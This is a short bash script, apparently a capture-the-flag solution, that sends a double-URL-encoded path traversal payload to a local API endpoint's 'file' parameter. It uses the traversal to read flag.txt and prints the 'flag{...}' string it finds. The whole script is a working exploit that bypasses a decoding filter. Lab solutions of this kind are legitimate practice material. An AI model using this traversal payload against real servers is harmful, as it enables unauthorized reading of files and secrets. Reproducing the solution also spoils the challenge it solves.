#!/usr/bin/env bash
set -euo pipefail

URL="http://localhost:8080/api/get"
PAYLOAD="%252e%252e%252f%252e%252e%252f%252e%252e%252fflag.txt"

resp=$(curl -sS "${URL}?file=${PAYLOAD}")

if [[ $resp =~ (flag\{[^}]+\}) ]]; then
  echo "${BASH_REMATCH[1]}"
else
  echo "$resp"
fi
